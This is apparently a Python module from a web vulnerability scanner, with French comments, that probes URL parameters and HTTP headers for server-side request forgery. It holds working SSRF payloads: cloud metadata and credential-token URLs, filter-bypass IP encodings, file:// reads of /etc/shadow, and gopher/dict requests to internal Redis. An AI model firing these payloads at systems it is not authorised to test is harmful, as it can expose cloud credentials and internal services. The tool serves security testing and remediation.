"""
PhantomScan — SSRF Scanner  v2.0
SSRF : cloud metadata, internal hosts, DNS rebinding, OOB/blind, IMDSv2 bypass.

Améliorations v2.0 :
  - OOB/blind SSRF : utilise un collaborator/canary URL (interactsh-like) si configuré
  - IMDSv2 bypass : inclut les payloads avec PUT + TTL header pour contourner IMDSv2
  - Encodages avancés : URL-encoded, double-encoded, IPv6-mapped IPv4, octal
  - SSRF via headers injection : Host, Referer, X-Forwarded-Host injectés avec métadata URLs
  - Protocol smuggling : dict://, gopher://, ftp://, tftp://
  - DNS rebinding payloads : domaines qui résolvent vers 127.0.0.1 après le premier lookup
"""

from __future__ import annotations

import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity


# Payloads SSRF → endpoints cloud metadata et internes
SSRF_PAYLOADS: list[tuple[str, str]] = [
    # ── Cloud metadata ────────────────────────────────────────────────────
    ("http://169.254.169.254/latest/meta-data/",              "AWS IMDSv1"),
    ("http://169.254.169.254/latest/meta-data/iam/",          "AWS IAM via IMDS"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS Identity doc"),
    ("http://metadata.google.internal/computeMetadata/v1/",   "GCP Metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP SA Token"),
    ("http://169.254.169.254/metadata/v1/",                   "DigitalOcean Metadata"),
    ("http://169.254.169.254/opc/v1/instance/",               "Oracle Cloud Metadata"),
    ("http://100.100.100.200/latest/meta-data/",              "Alibaba Cloud Metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
    # ── Encodages avancés (bypass filtres) ────────────────────────────────
    ("http://[::ffff:169.254.169.254]/latest/meta-data/",     "AWS via IPv6-mapped IPv4"),
    ("http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/", "AWS via IPv6 full"),
    ("http://169.254.169.254%2F/latest/meta-data/",           "AWS URL-encoded slash"),
    ("http://0251.0376.0251.0376/latest/meta-data/",          "AWS via octal IP"),
    ("http://0xa9fea9fe/latest/meta-data/",                   "AWS via hex IP"),
    ("http://169.254.169.254.nip.io/latest/meta-data/",       "AWS via nip.io DNS rebind"),
    # ── Loopback / interne ────────────────────────────────────────────────
    ("http://localhost/",                                       "Localhost"),
    ("http://127.0.0.1/",                                      "Loopback"),
    ("http://[::1]/",                                          "IPv6 loopback"),
    ("http://0.0.0.0/",                                        "Unspecified addr"),
    ("http://127.1/",                                          "Compact loopback"),
    ("http://0x7f000001/",                                     "Hex loopback"),
    ("http://2130706433/",                                     "Decimal loopback"),
    ("http://127.0.0.1:22/",                                   "Internal SSH"),
    ("http://127.0.0.1:6379/",                                 "Internal Redis"),
    ("http://127.0.0.1:5432/",                                 "Internal PostgreSQL"),
    ("http://127.0.0.1:27017/",                                "Internal MongoDB"),
    ("http://127.0.0.1:9200/",                                 "Internal Elasticsearch"),
    ("http://127.0.0.1:2375/",                                 "Docker API"),
    ("http://127.0.0.1:8500/",                                 "Consul API"),
    ("http://127.0.0.1:8080/",                                 "Internal alt-HTTP"),
    ("http://192.168.0.1/",                                    "Internal gateway 192.168"),
    ("http://10.0.0.1/",                                       "Internal 10.x"),
    # ── Protocol smuggling ────────────────────────────────────────────────
    ("file:///etc/passwd",                                      "LFI via file://"),
    ("file:///etc/shadow",                                      "Shadow via file://"),
    ("file:///proc/self/environ",                               "Process env via file://"),
    ("dict://127.0.0.1:6379/info",                             "Redis via dict://"),
    ("gopher://127.0.0.1:6379/_*1%0d%0a%24%34%0d%0ainfo%0d%0a", "Gopher → Redis INFO"),
    ("gopher://127.0.0.1:9200/_cat/indices",                   "Gopher → Elasticsearch"),
    # ── DNS rebinding ─────────────────────────────────────────────────────
    ("http://169.254.169.254.xip.io/latest/meta-data/",        "AWS via xip.io DNS rebind"),
    ("http://localtest.me/",                                    "Localtest.me → 127.0.0.1"),
]

# Payloads pour SSRF via injection d'en-têtes HTTP
SSRF_HEADER_PAYLOADS: list[tuple[str, str]] = [
    ("X-Forwarded-Host",          "169.254.169.254"),
    ("X-Host",                    "169.254.169.254"),
    ("Referer",                   "http://169.254.169.254/"),
    ("True-Client-IP",            "169.254.169.254"),
    ("X-Originating-IP",          "169.254.169.254"),
    ("X-Custom-IP-Authorization", "169.254.169.254"),
    ("X-Real-IP",                 "169.254.169.254"),
]

# Params typiquement sujets au SSRF
SSRF_PARAMS = {
    "url", "uri", "src", "source", "href", "link", "redirect",
    "next", "goto", "dest", "destination", "image", "img",
    "fetch", "load", "file", "path", "host", "proxy",
    "callback", "webhook", "endpoint", "api_url", "return",
}

# Indicateurs que le backend a fetch quelque chose
SSRF_SUCCESS_INDICATORS = [
    # AWS IMDS / EC2
    r"ami-id",
    r"instance-id",
    r"local-ipv4",
    r"iam/security-credentials",
    r"security-credentials",
    r"AccessKeyId",
    r"SecretAccessKey",
    r"Token.*:.*[A-Za-z0-9+/]{20}",
    r"placement/availability-zone",
    r"instance-type",
    r"public-hostname",
    r"mac.*:.*[0-9a-f]{2}:[0-9a-f]{2}",
    # GCP
    r"computeMetadata",
    r'email.*\.iam\.gserviceaccount\.com',
    r"access_token",
    r"expires_in",
    r"kube-env",
    # Azure IMDS
    r"subscriptionId",
    r"resourceGroupName",
    r"vmId",
    r"Managed Service Identity",
    # DigitalOcean / Generic cloud
    r"droplet_id",
    r"region.*:.*nyc|sfo|ams|sgp",
    # Internal services
    r"root:x:0:0",
    r"daemon:x:",
    r"\[boot loader\]",
    r"redis_version",
    r"redis_mode",
    r"connected_clients",
    r"used_memory_human",
    r"\+OK",                          # Redis auth response
    r"postgresql.*version",
    r"mongod.*version",
    r"MongoDB.*server",
    r"Elasticsearch.*version",
    r'\{.*"version".*"number"',   # Elasticsearch JSON
    r"mysql.*Ver.*Distrib",
    r"MariaDB.*server",
    r"ssh-rsa|ssh-ed25519|ecdsa-sha2",  # SSH banner
    r"220.*FTP|230.*Login",             # FTP banner
    r"SMTP.*220|220.*SMTP",
    r"Memcached.*VERSION",
    r"STORED|NOT_STORED|EXISTS",        # Memcached
    r"Consul.*agent",
    r"Kubernetes.*apiserver",
    r"etcd.*cluster",
    r"docker.*daemon",
]

# Patterns qui indiquent un FP (présents dans beaucoup de pages normales)
_SSRF_FP_PATTERNS = [
    r"^\s*$",
    r"<html",
    r"<!DOCTYPE",
    r"nginx/|Apache/",
    r"404 Not Found",
    r"403 Forbidden",
    r"cloudflare",
    r"recaptcha",
    r"__cf_bm",
    r"cf-ray",
]


from phantomscan.core.scanner_mixin import ScannerMixin


class SSRFScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg
        self._bus = None  # v5.6

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # v5.19 — Skip si déjà testé pour SSRF par un autre module/path équivalent
        if not await self.should_skip(target, "GET", "ssrf"):
            for param, values in params.items():
                if param.lower() not in SSRF_PARAMS:
                    continue
                async for f in self._probe_ssrf_param(target, parsed, params, param):
                    yield f
            await self.mark_tested(target, "GET", "ssrf")

        async for f in self._probe_common_ssrf_endpoints(target):
            yield f

        # v2.0 — SSRF via injection d'en-têtes HTTP
        async for f in self._probe_ssrf_headers(target):
            yield f

        # v5.19 — OOB blind SSRF avec polling réel via le canary manager
        if self.oob is not None and self.oob.enabled:
            async for f in self._probe_oob_ssrf_canary(target, parsed, params):
                yield f
        else:
            # Fallback : ancien comportement legacy (URL OOB statique)
            oob_url = (
                getattr(self._cfg, "ssrf_oob_url", None)
                or getattr(getattr(self._cfg, "scan", None), "ssrf_oob_url", None)
            )
            if oob_url:
                async for f in self._probe_oob_ssrf_legacy(target, parsed, params, oob_url):
                    yield f

        # v5.6 — endpoints bus
        if self._bus is not None:
            seen: set[str] = set()
            for ep in self._bus.snapshot:
                if ep.url in seen:
                    continue
                seen.add(ep.url)
                from urllib.parse import urlparse as _up, parse_qs as _pqs
                p = _up(ep.url)
                ep_params = _pqs(p.query, keep_blank_values=True)
                for param in ep_params:
                    if param.lower() in SSRF_PARAMS:
                        if await self.should_skip(ep.url, ep.method or "GET", "ssrf"):
                            continue
                        async for f in self._probe_ssrf_param(ep.url, p, ep_params, param):
                            yield f
                        await self.mark_tested(ep.url, ep.method or "GET", "ssrf")

    async def _probe_ssrf_param(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
    ) -> AsyncIterator[Finding]:
        for payload, desc in SSRF_PAYLOADS:
            fuzzed = dict(params)
            fuzzed[param] = [payload]
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))

            resp = await self._req.get(fuzz_url)
            if resp.error:
                continue

            # FIX: skip 404/erreurs HTTP explicites
            if resp.status in (404, 410, 400):
                continue
            hit, indicator = self._detect_ssrf_success(resp.body, resp.status)
            if hit:
                yield Finding(
                    title=f"SSRF — param `{param}` → {desc}",
                    severity=Severity.CRITICAL,
                    url=fuzz_url,
                    module="vulns/ssrf",
                    description=(
                        f"Le paramètre `{param}` est vulnérable au SSRF. "
                        f"Payload: {payload} a retourné un indicateur: `{indicator}`"
                    ),
                    evidence=f"Indicator: {indicator} | Status: {resp.status} | Payload: {payload}",
                    cwe="CWE-918",
                    remediation=(
                        "Valider et filtrer toutes les URL fournies par l'utilisateur. "
                        "Utiliser une allowlist de domaines/IPs. "
                        "Désactiver IMDSv1, utiliser IMDSv2 avec token."
                    ),
                )
                break  # Un finding par param suffit

    async def _probe_common_ssrf_endpoints(self, target: str) -> AsyncIterator[Finding]:
        """Probe les endpoints courants qui fetch des URLs."""
        base = target.rstrip("/")
        ssrf_endpoints = [
            "/api/fetch?url=",
            "/proxy?url=",
            "/image?url=",
            "/load?src=",
            "/webhook?target=",
            "/external?link=",
        ]

        for endpoint in ssrf_endpoints:
            for payload, desc in SSRF_PAYLOADS[:5]:  # Limité aux plus critiques
                probe_url = f"{base}{endpoint}{payload}"
                resp = await self._req.get(probe_url)
                if resp.error:
                    continue

                # FIX: skip 404/erreurs HTTP explicites
                if resp.status in (404, 410, 400):
                    continue
                hit, indicator = self._detect_ssrf_success(resp.body, resp.status)
                if hit:
                    yield Finding(
                        title=f"SSRF — endpoint {endpoint} → {desc}",
                        severity=Severity.CRITICAL,
                        url=probe_url,
                        module="vulns/ssrf",
                        description=f"Endpoint SSRF confirmé: {endpoint} avec payload {payload}",
                        evidence=f"Indicator: {indicator}",
                        cwe="CWE-918",
                        remediation="Supprimer ou sécuriser les endpoints qui fetch des URLs externes.",
                    )
                    break

    async def _probe_ssrf_headers(self, target: str) -> AsyncIterator[Finding]:
        """
        v2.0 — Inject des payloads SSRF dans des en-têtes HTTP courants.
        Utile quand le serveur utilise ces headers pour faire des requêtes back-end.
        """
        from phantomscan.core.requester import ProbeRequest

        for header_name, payload in SSRF_HEADER_PAYLOADS:
            resp = await self._req.send(ProbeRequest(
                method="GET",
                url=target,
                headers={header_name: payload},
            ))
            if resp.error or resp.status in (404, 410):
                continue

            hit, indicator = self._detect_ssrf_success(resp.body, resp.status)
            if hit:
                yield Finding(
                    title=f"SSRF via header `{header_name}`",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/ssrf",
                    description=(
                        f"L'injection du payload `{payload}` dans l'en-tête `{header_name}` "
                        "a provoqué une requête SSRF vers un endpoint interne ou de métadonnées cloud."
                    ),
                    evidence=f"Header: {header_name}: {payload} | Indicator: {indicator} | Status: {resp.status}",
                    cwe="CWE-918",
                    remediation=(
                        "Ne pas utiliser les en-têtes HTTP fournis par le client pour construire des URLs internes. "
                        "Valider et assainir tous les headers avant utilisation."
                    ),
                )
                break  # Un finding par cible suffit

    async def _probe_oob_ssrf_canary(
        self,
        target: str,
        parsed,
        params: dict,
    ) -> AsyncIterator[Finding]:
        """
        v5.19 — Blind SSRF avec backend OOB qui poll les hits réels.

        Pour chaque param suspect, on génère un Canary unique, on injecte son
        URL HTTP dans le param, on fire la requête, puis on poll le serveur OOB.
        Si un hit DNS ou HTTP arrive sur le canary → SSRF blind CONFIRMÉ.

        Avantage vs v5.18 : on ne retourne PAS un finding "à vérifier
        manuellement" mais un finding HIGH/CRITICAL réellement confirmé.
        """
        # On a au plus 5 params SSRF-suspects → 5 canaries simultanés
        candidate_params = [
            p for p in params.keys() if p.lower() in SSRF_PARAMS
        ][:5]
        if not candidate_params:
            return

        injected: list[tuple[str, str, str]] = []  # (param, fuzz_url, canary_id)

        # Phase 1 : injection
        for param in candidate_params:
            canary = self.get_canary(tag=f"ssrf:{param}")
            if canary is None:
                continue
            fuzzed = dict(params)
            fuzzed[param] = [canary.http_url]
            from urllib.parse import urlencode, urlunparse
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            try:
                await self._req.get(fuzz_url)
            except Exception:
                pass
            injected.append((param, fuzz_url, canary.id))

        if not injected:
            return

        # Phase 2 : laisser au serveur le temps de faire la requête sortante
        # puis poll le serveur OOB pour les hits
        import asyncio as _asyncio
        await _asyncio.sleep(2.0)

        for param, fuzz_url, canary_id in injected:
            hits = await self.wait_for_oob_hit(
                # Reconstruire un faux "canary" minimal pour la fonction
                type("X", (), {"id": canary_id})(),
                timeout=10.0,
            )
            if hits:
                # Hit reçu → SSRF blind confirmé
                proto = hits[0].get("protocol", "?")
                remote = hits[0].get("remote_address", "?")
                yield Finding(
                    title=f"Blind SSRF CONFIRMED — param `{param}` (OOB callback)",
                    severity=Severity.HIGH,
                    url=fuzz_url,
                    module="vulns/ssrf",
                    description=(
                        f"Blind SSRF confirmé : un callback {proto.upper()} a été "
                        f"reçu sur le canary OOB après injection du paramètre `{param}`. "
                        f"Origine du callback : {remote}.\n"
                        f"Le serveur a interprété et requêté l'URL fournie par "
                        f"l'attaquant, prouvant la présence d'un SSRF exploitable."
                    ),
                    evidence=(
                        f"Canary callback received | proto={proto} | "
                        f"remote={remote} | param={param}"
                    ),
                    cwe="CWE-918",
                    remediation=(
                        "Valider et filtrer toutes les URLs fournies par "
                        "l'utilisateur (allowlist stricte de domaines/IPs). "
                        "Bloquer les IPs privées/loopback (RFC 1918, 169.254/16). "
                        "Désactiver les redirects automatiques côté HTTP client. "
                        "Sur AWS : utiliser IMDSv2 et filtrer 169.254.169.254."
                    ),
                )
                # Enregistrer pour les futurs tests
                self.record_pattern_success(
                    vuln_type="ssrf",
                    param=param,
                    payload="<oob-callback>",
                    url=fuzz_url,
                    confidence=0.95,
                )

    async def _probe_oob_ssrf_legacy(
        self,
        target: str,
        parsed,
        params: dict,
        oob_url: str,
    ) -> AsyncIterator[Finding]:
        """
        Mode legacy : OOB URL statique fournie par l'utilisateur (sans polling).
        Conservé pour rétrocompatibilité avec ssrf_oob_url=...
        """
        from phantomscan.core.requester import ProbeRequest

        for param, values in params.items():
            if param.lower() not in SSRF_PARAMS:
                continue

            import uuid
            token = uuid.uuid4().hex[:8]
            oob_payload = f"{oob_url.rstrip('/')}/{token}-ssrf-{param}"

            fuzzed = dict(params)
            fuzzed[param] = [oob_payload]
            from urllib.parse import urlencode, urlunparse
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))

            await self._req.get(fuzz_url)  # On lance mais on n'analyse pas la réponse HTTP

            yield Finding(
                title=f"Blind SSRF probe — param `{param}` (OOB)",
                severity=Severity.MEDIUM,
                url=fuzz_url,
                module="vulns/ssrf",
                description=(
                    f"Un payload OOB a été injecté dans `{param}`. "
                    f"Vérifier les callbacks DNS/HTTP sur `{oob_url}` pour le token `{token}`.\n"
                    "Si un callback est reçu, le SSRF est confirmé (blind).\n"
                    "[Astuce v5.19] Utiliser --oob interactsh pour la confirmation automatique."
                ),
                evidence=f"OOB URL injectée : {oob_payload}",
                cwe="CWE-918",
                remediation=(
                    "Valider et filtrer toutes les URLs fournies par l'utilisateur. "
                    "Utiliser une allowlist stricte de domaines autorisés."
                ),
            )

    @staticmethod
    def _detect_ssrf_success(body: str, status: int) -> tuple[bool, str]:
        if not body:
            return False, ""
        # v5.20 — Vérifier que ce n'est pas une page HTML générique
        for fp_pat in _SSRF_FP_PATTERNS:
            if re.search(fp_pat, body[:100], re.I):
                # Page générique → exiger un match très spécifique (entropy > 3.0)
                for pattern in SSRF_SUCCESS_INDICATORS:
                    m = re.search(pattern, body, re.I)
                    if m:
                        from phantomscan.core.fp_guard import sig_entropy_ok
                        if sig_entropy_ok(m.group(0), body, min_entropy=3.0):
                            return True, m.group(0)
                return False, ""

        # Pas de page HTML → analyser le contenu
        for pattern in SSRF_SUCCESS_INDICATORS:
            m = re.search(pattern, body, re.I)
            if m:
                return True, m.group(0)

        # Réponse courte sur port interne = indicateur fort
        if status == 200 and 5 < len(body) < 2000:
            body_low = body.lower()
            internal_svc = ["redis", "ssh-", "mongodb", "postgres", "mysql", "memcached",
                           "elasticsearch", "consul", "etcd", "+ok", "220 ", "230 "]
            for kw in internal_svc:
                if kw in body_low:
                    return True, body[:120]
        return False, ""

